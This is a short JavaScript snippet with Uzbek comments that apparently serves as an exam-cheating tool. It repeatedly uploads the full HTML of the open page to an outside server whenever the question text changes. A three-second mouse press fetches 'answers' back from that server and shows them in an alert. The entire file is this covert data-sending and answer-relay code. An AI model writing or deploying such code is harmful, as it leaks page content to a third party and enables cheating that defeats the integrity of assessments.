(function(){
    const SERVER = 'https://f1-f2mq.onrender.com';
    let lastContent = "";

    async function sendPage() {
        const currentContent = document.body.innerText; // Faqat matn o'zgarganini tekshiramiz
        if (currentContent !== lastContent) {
            lastContent = currentContent;
            await fetch(SERVER + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: document.documentElement.outerHTML })
            });
        }
    }

    // Har 5 soniyada tekshiradi, agar savol o'zgargan bo'lsa yuboradi
    setInterval(sendPage, 5000);
    sendPage();

    // Javobni olish funksiyasi (3 soniya bosib turganda)
    let t;
    document.addEventListener('mousedown', () => {
        t = setTimeout(async () => {
            const r = await fetch(SERVER + '/latest');
            const d = await r.json();
            alert("JAVOBLAR:\n" + d.message); // Oddiy alert oynasida ko'rsatish (ishonchliroq)
        }, 3000);
    });
    document.addEventListener('mouseup', () => clearTimeout(t));
})();
